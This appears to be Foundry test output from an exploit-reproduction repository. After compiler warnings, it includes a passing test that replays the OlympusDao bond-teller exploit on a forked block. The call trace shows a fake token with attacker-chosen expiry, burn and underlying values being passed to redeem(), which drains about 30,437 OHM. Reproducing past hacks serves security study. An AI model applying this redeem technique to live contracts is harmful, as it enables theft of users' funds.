Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.14s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 306.32ms (179.96µs CPU time)

Ran 1 test for src/test/2022-10/OlympusDao_exp.sol:AttackContract
[PASS] testExploit() (gas: 127300)
Logs:
  ---------- Start from block 15794363 ----------
  Attacker OHM balance: 0.000000000
  Redeeming...
  Attacker OHM balance after hack: 30437.077948152

Traces:
  [134900] AttackContract::testExploit()
    ├─ [0] console::log("---------- Start from block %s ----------", 15794363 [1.579e7]) [staticcall]
    │   └─ ← [Stop] 
    ├─ [2468] OHM::balanceOf(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_decimal_uint(key: "Attacker OHM balance", val: 0, decimals: 9)
    ├─ [48699] → new FakeToken@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
    │   └─ ← [Return] 243 bytes of code
    ├─ [2468] OHM::balanceOf(BondFixedExpiryTeller: [0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156]) [staticcall]
    │   └─ ← [Return] 30437077948152 [3.043e13]
    ├─ [33743] BondFixedExpiryTeller::redeem(FakeToken: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 30437077948152 [3.043e13])
    │   ├─ [199] FakeToken::expiry() [staticcall]
    │   │   └─ ← [Return] 1
    │   ├─ [280] FakeToken::burn(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 30437077948152 [3.043e13])
    │   │   └─ ← [Stop] 
    │   ├─ [144] FakeToken::underlying() [staticcall]
    │   │   └─ ← [Return] OHM: [0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5]
    │   ├─ [25996] OHM::transfer(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 30437077948152 [3.043e13])
    │   │   ├─ emit Transfer(from: BondFixedExpiryTeller: [0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156], to: AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 30437077948152 [3.043e13])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [0] console::log("Redeeming...") [staticcall]
    │   └─ ← [Stop] 
    ├─ [468] OHM::balanceOf(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 30437077948152 [3.043e13]
    ├─ emit log_named_decimal_uint(key: "Attacker OHM balance after hack", val: 30437077948152 [3.043e13], decimals: 9)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 751.03ms (383.53ms CPU time)

Ran 2 test suites in 987.64ms (1.06s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
